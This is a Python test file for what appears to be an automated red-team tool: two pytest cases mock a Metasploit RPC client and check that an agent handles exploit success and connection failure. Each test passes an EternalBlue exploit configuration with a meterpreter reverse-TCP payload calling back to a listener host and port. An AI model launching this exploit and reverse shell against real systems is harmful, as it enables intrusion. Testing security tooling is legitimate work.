import pytest
from unittest.mock import AsyncMock, patch
from autored.subagents.msfagent import msfagent_subagent
from autored.tools.metasploit import MsfResult


@pytest.mark.asyncio
async def test_msfagent_executes_exploit():
    fake_result = MsfResult(
        method="execute_exploit", success=True,
        data={"job_id": 1},
    )
    with patch("autored.subagents.msfagent.metasploit_rpc") as mock_msf:
        mock_msf.ainvoke = AsyncMock(return_value=fake_result)
        result = await msfagent_subagent.ainvoke({
            "module": "exploit/windows/smb/ms17_010_eternalblue",
            "target": "10.10.10.40",
            "payload": "windows/x64/meterpreter/reverse_tcp",
            "lhost": "10.10.14.5", "lport": 4444,
            "engagement_id": "test",
        })
    assert result.success is True


@pytest.mark.asyncio
async def test_msfagent_handles_rpc_unreachable():
    """Review Focus: Metasploit RPC unreachable returns clear error."""
    fake_result = MsfResult(
        method="execute_exploit", success=False,
        error="Connection refused",
    )
    with patch("autored.subagents.msfagent.metasploit_rpc") as mock_msf:
        mock_msf.ainvoke = AsyncMock(return_value=fake_result)
        result = await msfagent_subagent.ainvoke({
            "module": "exploit/windows/smb/ms17_010_eternalblue",
            "target": "10.10.10.40",
            "payload": "windows/x64/meterpreter/reverse_tcp",
            "lhost": "10.10.14.5", "lport": 4444,
            "engagement_id": "test",
        })
    assert result.success is False
    assert "Connection refused" in result.error
